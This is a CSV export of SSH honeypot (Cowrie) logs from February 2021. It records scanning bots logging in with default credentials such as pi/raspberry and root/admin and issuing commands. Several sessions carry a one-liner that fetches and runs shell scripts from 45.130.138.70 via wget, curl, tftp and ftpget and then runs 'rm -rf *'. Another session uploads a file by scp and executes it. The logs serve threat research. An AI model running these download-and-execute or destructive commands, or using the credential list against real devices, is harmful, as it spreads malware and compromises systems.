eventid,timestamp,src_ip,dst_ip,session,duration,message
cowrie.client.version,2021-02-12 16:27:07.112256+00:00,171.240.202.57,,6dbf696052b3,,Remote SSH version: b'SSH-2.0-AsyncSSH_2.1.0'
cowrie.client.kex,2021-02-12 16:27:07.448407+00:00,171.240.202.57,,6dbf696052b3,,SSH client hassh fingerprint: fda360b1b4f4d3455cb75c6e7edb1d11
cowrie.login.success,2021-02-12 16:27:09.388085+00:00,171.240.202.57,,6dbf696052b3,,login attempt [user/1234] succeeded
cowrie.direct-tcpip.request,2021-02-12 16:27:09.788343+00:00,171.240.202.57,208.95.112.1,6dbf696052b3,,direct-tcp connection request to 208.95.112.1:80 from :0
cowrie.direct-tcpip.data,2021-02-12 16:27:10.180023+00:00,171.240.202.57,208.95.112.1,6dbf696052b3,,"discarded direct-tcp forward request 0 to 208.95.112.1:80 with data b'GET /json?fields=countryCode,query,as HTTP/1.1\r\nHost: ip-api.com\r\nUser-Agent: curl\r\n\r\n'"
cowrie.session.closed,2021-02-12 16:27:10.632569+00:00,171.240.202.57,,6dbf696052b3,3.572897911071777,Connection lost after 3 seconds
cowrie.session.connect,2021-02-12 16:27:13.757472+00:00,116.98.170.70,155.232.195.83,39f7f0cf2f30,,New connection: 116.98.170.70:58800 (155.232.195.83:2222) [session: 39f7f0cf2f30]
cowrie.client.version,2021-02-12 16:27:13.759100+00:00,116.98.170.70,,39f7f0cf2f30,,Remote SSH version: b'SSH-2.0-AsyncSSH_2.1.0'
cowrie.client.kex,2021-02-12 16:27:14.254001+00:00,116.98.170.70,,39f7f0cf2f30,,SSH client hassh fingerprint: fda360b1b4f4d3455cb75c6e7edb1d11
cowrie.login.success,2021-02-12 16:27:15.436668+00:00,116.98.170.70,,39f7f0cf2f30,,login attempt [admin/0l0ctyQh243O63uD] succeeded
cowrie.direct-tcpip.request,2021-02-12 16:27:15.855663+00:00,116.98.170.70,208.95.112.1,39f7f0cf2f30,,direct-tcp connection request to 208.95.112.1:80 from :0
cowrie.direct-tcpip.data,2021-02-12 16:27:16.252108+00:00,116.98.170.70,208.95.112.1,39f7f0cf2f30,,"discarded direct-tcp forward request 0 to 208.95.112.1:80 with data b'GET /json?fields=countryCode,query,as HTTP/1.1\r\nHost: ip-api.com\r\nUser-Agent: curl\r\n\r\n'"
cowrie.session.closed,2021-02-12 16:27:16.644903+00:00,116.98.170.70,,39f7f0cf2f30,2.8859140872955322,Connection lost after 2 seconds
cowrie.session.connect,2021-02-12 16:27:17.198621+00:00,171.240.202.57,155.232.195.83,eab7ad56c6c1,,New connection: 171.240.202.57:46420 (155.232.195.83:2222) [session: eab7ad56c6c1]
cowrie.client.version,2021-02-12 16:27:17.209020+00:00,171.240.202.57,,eab7ad56c6c1,,Remote SSH version: b'SSH-2.0-AsyncSSH_2.1.0'
cowrie.client.kex,2021-02-12 16:27:17.575745+00:00,171.240.202.57,,eab7ad56c6c1,,SSH client hassh fingerprint: fda360b1b4f4d3455cb75c6e7edb1d11
cowrie.login.success,2021-02-12 16:27:19.088713+00:00,171.240.202.57,,eab7ad56c6c1,,login attempt [admin/123456789] succeeded
cowrie.direct-tcpip.request,2021-02-12 16:27:19.472476+00:00,171.240.202.57,208.95.112.1,eab7ad56c6c1,,direct-tcp connection request to 208.95.112.1:80 from :0
cowrie.direct-tcpip.data,2021-02-12 16:27:19.850053+00:00,171.240.202.57,208.95.112.1,eab7ad56c6c1,,"discarded direct-tcp forward request 0 to 208.95.112.1:80 with data b'GET /json?fields=countryCode,query,as HTTP/1.1\r\nHost: ip-api.com\r\nUser-Agent: curl\r\n\r\n'"
cowrie.session.closed,2021-02-12 16:27:20.228543+00:00,171.240.202.57,,eab7ad56c6c1,3.028362274169922,Connection lost after 3 seconds
cowrie.session.connect,2021-02-12 16:44:39.107230+00:00,66.69.127.115,155.232.195.82,fe7f322b63d6,,New connection: 66.69.127.115:40538 (155.232.195.82:2222) [session: fe7f322b63d6]
cowrie.session.connect,2021-02-12 16:44:39.113331+00:00,66.69.127.115,155.232.195.82,1fda2a0309a0,,New connection: 66.69.127.115:40540 (155.232.195.82:2222) [session: 1fda2a0309a0]
cowrie.client.version,2021-02-12 16:44:39.335796+00:00,66.69.127.115,,fe7f322b63d6,,Remote SSH version: b'SSH-2.0-OpenSSH_7.9p1 Raspbian-10+deb10u2'
cowrie.client.version,2021-02-12 16:44:39.340496+00:00,66.69.127.115,,1fda2a0309a0,,Remote SSH version: b'SSH-2.0-OpenSSH_7.9p1 Raspbian-10+deb10u2'
cowrie.client.kex,2021-02-12 16:44:39.564698+00:00,66.69.127.115,,fe7f322b63d6,,SSH client hassh fingerprint: ec7378c1a92f5a8dde7e8b7a1ddf33d1
cowrie.client.kex,2021-02-12 16:44:39.570383+00:00,66.69.127.115,,1fda2a0309a0,,SSH client hassh fingerprint: ec7378c1a92f5a8dde7e8b7a1ddf33d1
cowrie.login.success,2021-02-12 16:44:40.735165+00:00,66.69.127.115,,fe7f322b63d6,,login attempt [pi/raspberry] succeeded
cowrie.login.success,2021-02-12 16:44:40.740356+00:00,66.69.127.115,,1fda2a0309a0,,login attempt [pi/raspberryraspberry993311] succeeded
cowrie.client.var,2021-02-12 16:44:41.193479+00:00,66.69.127.115,,fe7f322b63d6,,request_env: LANG=en_GB.UTF-8
cowrie.session.params,2021-02-12 16:44:41.237912+00:00,66.69.127.115,,fe7f322b63d6,,[]
cowrie.command.input,2021-02-12 16:44:41.238762+00:00,66.69.127.115,,fe7f322b63d6,,CMD: scp -t /tmp/SCmx6m2L
cowrie.client.var,2021-02-12 16:44:41.241051+00:00,66.69.127.115,,1fda2a0309a0,,request_env: LANG=en_GB.UTF-8
cowrie.session.params,2021-02-12 16:44:41.323411+00:00,66.69.127.115,,1fda2a0309a0,,[]
cowrie.command.input,2021-02-12 16:44:41.324354+00:00,66.69.127.115,,1fda2a0309a0,,CMD: scp -t /tmp/SCmx6m2L
cowrie.session.file_download,2021-02-12 16:44:41.484830+00:00,66.69.127.115,,fe7f322b63d6,,Saved stdin contents with SHA-256 c2e7599b029156b9b3c93b1359d010cf87f6aba2e83654fe4a12128f94809603 to var/lib/cowrie/downloads/c2e7599b029156b9b3c93b1359d010cf87f6aba2e83654fe4a12128f94809603
cowrie.log.closed,2021-02-12 16:44:41.485900+00:00,66.69.127.115,,fe7f322b63d6,0.248154163360595,Closing TTY Log: var/lib/cowrie/tty/8cd4f681eadd6b3f675d2857ef92bb1110fc763b250894be6467b1690b866a85 after 0 seconds
cowrie.session.file_download,2021-02-12 16:44:41.568949+00:00,66.69.127.115,,1fda2a0309a0,,Saved stdin contents with SHA-256 c2e7599b029156b9b3c93b1359d010cf87f6aba2e83654fe4a12128f94809603 to var/lib/cowrie/downloads/c2e7599b029156b9b3c93b1359d010cf87f6aba2e83654fe4a12128f94809603
cowrie.log.closed,2021-02-12 16:44:41.570351+00:00,66.69.127.115,,1fda2a0309a0,0.24711084365844702,Closing TTY Log: var/lib/cowrie/tty/8cd4f681eadd6b3f675d2857ef92bb1110fc763b250894be6467b1690b866a85 after 0 seconds
cowrie.session.closed,2021-02-12 16:44:41.722757+00:00,66.69.127.115,,fe7f322b63d6,2.613934993743896,Connection lost after 2 seconds
cowrie.session.closed,2021-02-12 16:44:41.808080+00:00,66.69.127.115,,1fda2a0309a0,2.6934974193573,Connection lost after 2 seconds
cowrie.session.connect,2021-02-12 16:44:42.024391+00:00,66.69.127.115,155.232.195.82,26d0250149f2,,New connection: 66.69.127.115:40724 (155.232.195.82:2222) [session: 26d0250149f2]
cowrie.session.connect,2021-02-12 16:44:42.110488+00:00,66.69.127.115,155.232.195.82,f0ad1b78244f,,New connection: 66.69.127.115:40732 (155.232.195.82:2222) [session: f0ad1b78244f]
cowrie.client.version,2021-02-12 16:44:42.255209+00:00,66.69.127.115,,26d0250149f2,,Remote SSH version: b'SSH-2.0-OpenSSH_7.9p1 Raspbian-10+deb10u2'
cowrie.client.version,2021-02-12 16:44:42.343130+00:00,66.69.127.115,,f0ad1b78244f,,Remote SSH version: b'SSH-2.0-OpenSSH_7.9p1 Raspbian-10+deb10u2'
cowrie.client.kex,2021-02-12 16:44:42.481579+00:00,66.69.127.115,,26d0250149f2,,SSH client hassh fingerprint: ec7378c1a92f5a8dde7e8b7a1ddf33d1
cowrie.client.kex,2021-02-12 16:44:42.570286+00:00,66.69.127.115,,f0ad1b78244f,,SSH client hassh fingerprint: ec7378c1a92f5a8dde7e8b7a1ddf33d1
cowrie.login.success,2021-02-12 16:44:43.637015+00:00,66.69.127.115,,26d0250149f2,,login attempt [pi/raspberry] succeeded
cowrie.login.success,2021-02-12 16:44:43.750993+00:00,66.69.127.115,,f0ad1b78244f,,login attempt [pi/raspberryraspberry993311] succeeded
cowrie.client.var,2021-02-12 16:44:44.095396+00:00,66.69.127.115,,26d0250149f2,,request_env: LANG=en_GB.UTF-8
cowrie.session.params,2021-02-12 16:44:44.131707+00:00,66.69.127.115,,26d0250149f2,,[]
cowrie.command.input,2021-02-12 16:44:44.132623+00:00,66.69.127.115,,26d0250149f2,,CMD: cd /tmp && chmod +x SCmx6m2L && bash -c ./SCmx6m2L
cowrie.command.input,2021-02-12 16:44:44.134052+00:00,66.69.127.115,,26d0250149f2,,CMD: ./SCmx6m2L
cowrie.command.failed,2021-02-12 16:44:44.134825+00:00,66.69.127.115,,26d0250149f2,,Command not found: ./SCmx6m2L
cowrie.log.closed,2021-02-12 16:44:44.136590+00:00,66.69.127.115,,26d0250149f2,0.005055427551269,Closing TTY Log: var/lib/cowrie/tty/0df33eb3cd69e5084779524036696928dcb677907d16be0322cd13d3a0eb5340 after 0 seconds
cowrie.client.var,2021-02-12 16:44:44.215843+00:00,66.69.127.115,,f0ad1b78244f,,request_env: LANG=en_GB.UTF-8
cowrie.session.params,2021-02-12 16:44:44.360403+00:00,66.69.127.115,,f0ad1b78244f,,[]
cowrie.command.input,2021-02-12 16:44:44.361254+00:00,66.69.127.115,,f0ad1b78244f,,CMD: cd /tmp && chmod +x SCmx6m2L && bash -c ./SCmx6m2L
cowrie.command.input,2021-02-12 16:44:44.362675+00:00,66.69.127.115,,f0ad1b78244f,,CMD: ./SCmx6m2L
cowrie.command.failed,2021-02-12 16:44:44.363432+00:00,66.69.127.115,,f0ad1b78244f,,Command not found: ./SCmx6m2L
cowrie.log.closed,2021-02-12 16:44:44.365113+00:00,66.69.127.115,,f0ad1b78244f,0.004879951477050001,Closing TTY Log: var/lib/cowrie/tty/0df33eb3cd69e5084779524036696928dcb677907d16be0322cd13d3a0eb5340 after 0 seconds
cowrie.session.closed,2021-02-12 16:44:44.366880+00:00,66.69.127.115,,26d0250149f2,2.34097671508789,Connection lost after 2 seconds
cowrie.session.closed,2021-02-12 16:44:44.604707+00:00,66.69.127.115,,f0ad1b78244f,2.492746114730835,Connection lost after 2 seconds
cowrie.session.connect,2021-02-12 16:45:08.133536+00:00,212.126.127.50,155.232.195.83,457497b357ab,,New connection: 212.126.127.50:47489 (155.232.195.83:2222) [session: 457497b357ab]
cowrie.session.closed,2021-02-12 16:45:08.449501+00:00,212.126.127.50,,457497b357ab,0.31445193290710405,Connection lost after 0 seconds
cowrie.session.connect,2021-02-12 16:45:24.194539+00:00,212.126.127.50,155.232.195.82,9ce202dce7b0,,New connection: 212.126.127.50:49420 (155.232.195.82:2222) [session: 9ce202dce7b0]
cowrie.session.closed,2021-02-12 16:45:24.509182+00:00,212.126.127.50,,9ce202dce7b0,0.31304526329040505,Connection lost after 0 seconds
cowrie.session.connect,2021-02-12 16:52:28.504920+00:00,104.50.4.139,155.232.195.82,d91de89066ef,,New connection: 104.50.4.139:50335 (155.232.195.82:2222) [session: d91de89066ef]
cowrie.client.version,2021-02-12 16:52:28.806010+00:00,104.50.4.139,,d91de89066ef,,Remote SSH version: b'SSH-2.0-libssh-0.5.2'
cowrie.session.closed,2021-02-12 16:52:29.118799+00:00,104.50.4.139,,d91de89066ef,0.6126525402069091,Connection lost after 0 seconds
cowrie.session.connect,2021-02-12 16:56:15.108140+00:00,167.99.36.34,155.232.195.82,7e4a97bd8740,,New connection: 167.99.36.34:40934 (155.232.195.82:2222) [session: 7e4a97bd8740]
cowrie.session.closed,2021-02-12 16:56:15.293585+00:00,167.99.36.34,,7e4a97bd8740,0.183884143829345,Connection lost after 0 seconds
cowrie.session.connect,2021-02-12 16:56:24.983858+00:00,167.99.36.34,155.232.195.82,d6138496faf9,,New connection: 167.99.36.34:52824 (155.232.195.82:2222) [session: d6138496faf9]
cowrie.client.version,2021-02-12 16:56:24.985777+00:00,167.99.36.34,,d6138496faf9,,Remote SSH version: b'SSH-2.0-libssh2_1.4.3'
cowrie.client.kex,2021-02-12 16:56:25.169179+00:00,167.99.36.34,,d6138496faf9,,SSH client hassh fingerprint: 92674389fa1e47a27ddd8d9b63ecd42b
cowrie.login.failed,2021-02-12 16:56:25.967532+00:00,167.99.36.34,,d6138496faf9,,login attempt [root/root] failed
cowrie.session.closed,2021-02-12 16:56:27.157746+00:00,167.99.36.34,,d6138496faf9,2.172342777252197,Connection lost after 2 seconds
cowrie.session.connect,2021-02-12 16:56:34.418833+00:00,167.99.36.34,155.232.195.82,7f63eb901bfe,,New connection: 167.99.36.34:59518 (155.232.195.82:2222) [session: 7f63eb901bfe]
cowrie.client.version,2021-02-12 16:56:34.420514+00:00,167.99.36.34,,7f63eb901bfe,,Remote SSH version: b'SSH-2.0-libssh2_1.4.3'
cowrie.client.kex,2021-02-12 16:56:34.604367+00:00,167.99.36.34,,7f63eb901bfe,,SSH client hassh fingerprint: 92674389fa1e47a27ddd8d9b63ecd42b
cowrie.login.failed,2021-02-12 16:56:35.356925+00:00,167.99.36.34,,7f63eb901bfe,,login attempt [root/123456] failed
cowrie.session.closed,2021-02-12 16:56:36.542029+00:00,167.99.36.34,,7f63eb901bfe,2.121649503707885,Connection lost after 2 seconds
cowrie.session.connect,2021-02-12 16:56:43.480260+00:00,167.99.36.34,155.232.195.82,19e03c74d5c0,,New connection: 167.99.36.34:38192 (155.232.195.82:2222) [session: 19e03c74d5c0]
cowrie.client.version,2021-02-12 16:56:43.481401+00:00,167.99.36.34,,19e03c74d5c0,,Remote SSH version: b'SSH-2.0-libssh2_1.4.3'
cowrie.client.kex,2021-02-12 16:56:43.667536+00:00,167.99.36.34,,19e03c74d5c0,,SSH client hassh fingerprint: 92674389fa1e47a27ddd8d9b63ecd42b
cowrie.login.success,2021-02-12 16:56:44.423589+00:00,167.99.36.34,,19e03c74d5c0,,login attempt [root/admin] succeeded
cowrie.session.params,2021-02-12 16:56:44.929285+00:00,167.99.36.34,,19e03c74d5c0,,[]
cowrie.command.input,2021-02-12 16:56:44.930127+00:00,167.99.36.34,,19e03c74d5c0,,CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.130.138.70/sh; curl -O http://45.130.138.70/sh; chmod 777 sh; sh sh; tftp 45.130.138.70 -c get bins.sh; chmod 777 bins.sh; sh bins.sh; tftp -r .sh -g 45.130.138.70; chmod 777 .sh; sh .sh; ftpget -v -u anonymous -p anonymous -P 21 45.130.138.70 .sh .sh; sh .sh; rm -rf sh bins.sh .sh .sh; rm -rf *
cowrie.session.file_download,2021-02-12 16:56:45.305144+00:00,167.99.36.34,,19e03c74d5c0,,Downloaded URL (http://45.130.138.70/sh) with SHA-256 e715d46c4c19415d1f47f669e8cd248fa04cfffa7d593040d4e96e01e23b9de3 to var/lib/cowrie/downloads/e715d46c4c19415d1f47f669e8cd248fa04cfffa7d593040d4e96e01e23b9de3
cowrie.session.file_download,2021-02-12 16:56:45.678053+00:00,167.99.36.34,,19e03c74d5c0,,Downloaded URL (http://45.130.138.70/sh) with SHA-256 e715d46c4c19415d1f47f669e8cd248fa04cfffa7d593040d4e96e01e23b9de3 to var/lib/cowrie/downloads/e715d46c4c19415d1f47f669e8cd248fa04cfffa7d593040d4e96e01e23b9de3
cowrie.session.file_download.failed,2021-02-12 16:57:35.912169+00:00,167.99.36.34,,19e03c74d5c0,,Attempt to download file(s) from URL (ftp://anonymous:anonymous@45.130.138.70/.sh) failed
cowrie.session.connect,2021-02-12 16:57:35.914712+00:00,167.99.36.34,155.232.195.82,1bca8300e310,,New connection: 167.99.36.34:44988 (155.232.195.82:2222) [session: 1bca8300e310]
cowrie.session.connect,2021-02-12 16:57:35.915859+00:00,167.99.36.34,155.232.195.82,f62fa89d5606,,New connection: 167.99.36.34:51840 (155.232.195.82:2222) [session: f62fa89d5606]
cowrie.session.connect,2021-02-12 16:57:35.916992+00:00,167.99.36.34,155.232.195.82,a57c269b10a0,,New connection: 167.99.36.34:58658 (155.232.195.82:2222) [session: a57c269b10a0]
cowrie.session.connect,2021-02-12 16:57:35.918618+00:00,167.99.36.34,155.232.195.82,0d6030820f53,,New connection: 167.99.36.34:37246 (155.232.195.82:2222) [session: 0d6030820f53]
cowrie.session.connect,2021-02-12 16:57:35.919745+00:00,167.99.36.34,155.232.195.82,e984d832fbc5,,New connection: 167.99.36.34:44024 (155.232.195.82:2222) [session: e984d832fbc5]
cowrie.client.version,2021-02-12 16:57:35.920796+00:00,167.99.36.34,,1bca8300e310,,Remote SSH version: b'SSH-2.0-libssh2_1.4.3'
cowrie.client.version,2021-02-12 16:57:35.921892+00:00,167.99.36.34,,f62fa89d5606,,Remote SSH version: b'SSH-2.0-libssh2_1.4.3'
cowrie.client.version,2021-02-12 16:57:35.922687+00:00,167.99.36.34,,a57c269b10a0,,Remote SSH version: b'SSH-2.0-libssh2_1.4.3'
cowrie.client.version,2021-02-12 16:57:35.923480+00:00,167.99.36.34,,0d6030820f53,,Remote SSH version: b'SSH-2.0-libssh2_1.4.3'
cowrie.client.version,2021-02-12 16:57:35.924295+00:00,167.99.36.34,,e984d832fbc5,,Remote SSH version: b'SSH-2.0-libssh2_1.4.3'
cowrie.client.kex,2021-02-12 16:57:36.104588+00:00,167.99.36.34,,1bca8300e310,,SSH client hassh fingerprint: 92674389fa1e47a27ddd8d9b63ecd42b
cowrie.client.kex,2021-02-12 16:57:36.106899+00:00,167.99.36.34,,0d6030820f53,,SSH client hassh fingerprint: 92674389fa1e47a27ddd8d9b63ecd42b
cowrie.client.kex,2021-02-12 16:57:36.109597+00:00,167.99.36.34,,f62fa89d5606,,SSH client hassh fingerprint: 92674389fa1e47a27ddd8d9b63ecd42b
cowrie.client.kex,2021-02-12 16:57:36.111604+00:00,167.99.36.34,,e984d832fbc5,,SSH client hassh fingerprint: 92674389fa1e47a27ddd8d9b63ecd42b
cowrie.session.closed,2021-02-12 16:57:36.116735+00:00,167.99.36.34,,19e03c74d5c0,52.635413646698,Connection lost after 52 seconds
cowrie.client.kex,2021-02-12 16:57:36.117552+00:00,167.99.36.34,,a57c269b10a0,,SSH client hassh fingerprint: 92674389fa1e47a27ddd8d9b63ecd42b
cowrie.login.success,2021-02-12 16:57:36.859730+00:00,167.99.36.34,,1bca8300e310,,login attempt [root/test] succeeded
cowrie.login.success,2021-02-12 16:57:36.930637+00:00,167.99.36.34,,0d6030820f53,,login attempt [root/1234567890] succeeded
cowrie.login.success,2021-02-12 16:57:36.936034+00:00,167.99.36.34,,e984d832fbc5,,login attempt [ansible/ansible] succeeded
cowrie.login.success,2021-02-12 16:57:36.938906+00:00,167.99.36.34,,a57c269b10a0,,login attempt [root/123456789] succeeded
cowrie.login.success,2021-02-12 16:57:36.948431+00:00,167.99.36.34,,f62fa89d5606,,login attempt [root/12345678] succeeded
cowrie.session.params,2021-02-12 16:57:37.260152+00:00,167.99.36.34,,1bca8300e310,,[]
cowrie.command.input,2021-02-12 16:57:37.261009+00:00,167.99.36.34,,1bca8300e310,,CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.130.138.70/sh; curl -O http://45.130.138.70/sh; chmod 777 sh; sh sh; tftp 45.130.138.70 -c get bins.sh; chmod 777 bins.sh; sh bins.sh; tftp -r .sh -g 45.130.138.70; chmod 777 .sh; sh .sh; ftpget -v -u anonymous -p anonymous -P 21 45.130.138.70 .sh .sh; sh .sh; rm -rf sh bins.sh .sh .sh; rm -rf *
cowrie.session.params,2021-02-12 16:57:37.402312+00:00,167.99.36.34,,0d6030820f53,,[]
cowrie.command.input,2021-02-12 16:57:37.403157+00:00,167.99.36.34,,0d6030820f53,,CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.130.138.70/sh; curl -O http://45.130.138.70/sh; chmod 777 sh; sh sh; tftp 45.130.138.70 -c get bins.sh; chmod 777 bins.sh; sh bins.sh; tftp -r .sh -g 45.130.138.70; chmod 777 .sh; sh .sh; ftpget -v -u anonymous -p anonymous -P 21 45.130.138.70 .sh .sh; sh .sh; rm -rf sh bins.sh .sh .sh; rm -rf *
cowrie.session.params,2021-02-12 16:57:37.438124+00:00,167.99.36.34,,e984d832fbc5,,[]
cowrie.command.input,2021-02-12 16:57:37.439054+00:00,167.99.36.34,,e984d832fbc5,,CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.130.138.70/sh; curl -O http://45.130.138.70/sh; chmod 777 sh; sh sh; tftp 45.130.138.70 -c get bins.sh; chmod 777 bins.sh; sh bins.sh; tftp -r .sh -g 45.130.138.70; chmod 777 .sh; sh .sh; ftpget -v -u anonymous -p anonymous -P 21 45.130.138.70 .sh .sh; sh .sh; rm -rf sh bins.sh .sh .sh; rm -rf *
cowrie.session.params,2021-02-12 16:57:37.564305+00:00,167.99.36.34,,a57c269b10a0,,[]
cowrie.command.input,2021-02-12 16:57:37.565156+00:00,167.99.36.34,,a57c269b10a0,,CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.130.138.70/sh; curl -O http://45.130.138.70/sh; chmod 777 sh; sh sh; tftp 45.130.138.70 -c get bins.sh; chmod 777 bins.sh; sh bins.sh; tftp -r .sh -g 45.130.138.70; chmod 777 .sh; sh .sh; ftpget -v -u anonymous -p anonymous -P 21 45.130.138.70 .sh .sh; sh .sh; rm -rf sh bins.sh .sh .sh; rm -rf *
cowrie.session.params,2021-02-12 16:57:37.717463+00:00,167.99.36.34,,f62fa89d5606,,[]
cowrie.command.input,2021-02-12 16:57:37.718364+00:00,167.99.36.34,,f62fa89d5606,,CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.130.138.70/sh; curl -O http://45.130.138.70/sh; chmod 777 sh; sh sh; tftp 45.130.138.70 -c get bins.sh; chmod 777 bins.sh; sh bins.sh; tftp -r .sh -g 45.130.138.70; chmod 777 .sh; sh .sh; ftpget -v -u anonymous -p anonymous -P 21 45.130.138.70 .sh .sh; sh .sh; rm -rf sh bins.sh .sh .sh; rm -rf *
cowrie.session.file_download,2021-02-12 16:57:37.908894+00:00,167.99.36.34,,0d6030820f53,,Downloaded URL (http://45.130.138.70/sh) with SHA-256 e715d46c4c19415d1f47f669e8cd248fa04cfffa7d593040d4e96e01e23b9de3 to var/lib/cowrie/downloads/e715d46c4c19415d1f47f669e8cd248fa04cfffa7d593040d4e96e01e23b9de3
cowrie.session.file_download,2021-02-12 16:57:37.913257+00:00,167.99.36.34,,1bca8300e310,,Downloaded URL (http://45.130.138.70/sh) with SHA-256 e715d46c4c19415d1f47f669e8cd248fa04cfffa7d593040d4e96e01e23b9de3 to var/lib/cowrie/downloads/e715d46c4c19415d1f47f669e8cd248fa04cfffa7d593040d4e96e01e23b9de3
cowrie.session.file_download,2021-02-12 16:57:38.092448+00:00,167.99.36.34,,e984d832fbc5,,Downloaded URL (http://45.130.138.70/sh) with SHA-256 e715d46c4c19415d1f47f669e8cd248fa04cfffa7d593040d4e96e01e23b9de3 to var/lib/cowrie/downloads/e715d46c4c19415d1f47f669e8cd248fa04cfffa7d593040d4e96e01e23b9de3
